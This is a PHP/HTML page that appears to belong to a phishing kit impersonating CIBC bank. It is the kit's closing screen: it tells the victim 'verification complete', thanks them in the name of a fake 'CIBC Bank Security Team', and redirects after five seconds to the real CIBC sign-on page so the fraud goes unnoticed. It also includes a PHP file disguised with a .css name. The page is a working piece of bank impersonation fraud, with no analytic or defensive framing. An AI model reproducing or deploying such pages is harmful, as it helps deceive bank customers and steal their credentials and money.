<?PHP
error_reporting(0);
session_start();
include('identity/lib/css/S-DST.css');


?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>CIBC</title>
<meta name="generator" content="WYSIWYG Web Builder 12 Trial Version - http://www.wysiwygwebbuilder.com">
<meta http-equiv="refresh" content="5; URL=https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/index.html#/signon">
<link href="images/favicon.png" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled2.css" rel="stylesheet" type="text/css">
<link href="css/fin.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="wb_Image2" style="position:absolute;left:0px;top:0px;width:1315px;height:691px;z-index:4;">
<img src="images/0.PNG" id="Image2" alt=""></div>
<div id="wb_Image1" style="position:absolute;left:0px;top:701px;width:1315px;height:302px;z-index:5;">
<img src="images/2.PNG" id="Image1" alt=""></div>

<div id="wb_Form1" style="position:absolute;left:263px;top:278px;width:560px;height:40px;z-index:7;">
<form name="Form1" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form1">
</form>
</div>
<div id="wb_Form2" style="position:absolute;left:201px;top:160px;width:659px;height:497px;z-index:8;">
<form name="Form2" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form2">
<div id="wb_Form3" style="position:absolute;left:12px;top:23px;width:633px;height:245px;z-index:1;">
<form name="Form3" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form3">
<div id="wb_Text1" style="position:absolute;left:26px;top:28px;width:577px;height:159px;z-index:0;">
<span style="color:#FF0000;font-family:Arial;font-size:17px;"><strong>CIBC Bank Verification<br></strong></span><span style="color:#0000CD;font-family:Arial;font-size:17px;"><strong>verification complete !<br></strong></span><span style="color:#000000;font-family:Arial;font-size:13px;">Note </span><span style="color:#696969;font-family:Arial;font-size:13px;">: You may now use your account as usual .You will be redirected to our main login page in few moments<br><br>We are sorry for the inconvenience that this might have caused you . We will update your account within the next 24 hours </span><span style="color:#000000;font-family:Arial;font-size:13px;"><br><br></span><span style="color:#0000FF;font-family:Arial;font-size:17px;"><strong>CIBC Bank Security Team</strong></span></div>
</form>
</div>
</form>
</div>
<div id="wb_Form4" style="position:absolute;left:249px;top:121px;width:378px;height:48px;z-index:9;">
<form name="Form4" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form4">
<div id="wb_Text8" style="position:absolute;left:0px;top:0px;width:283px;height:25px;z-index:2;">
<span style="color:#D60139;font-family:'Bookman Old Style';font-size:21px;"><strong>Congratulation !</strong></span></div>
</form>
</div>
</body>
</html>
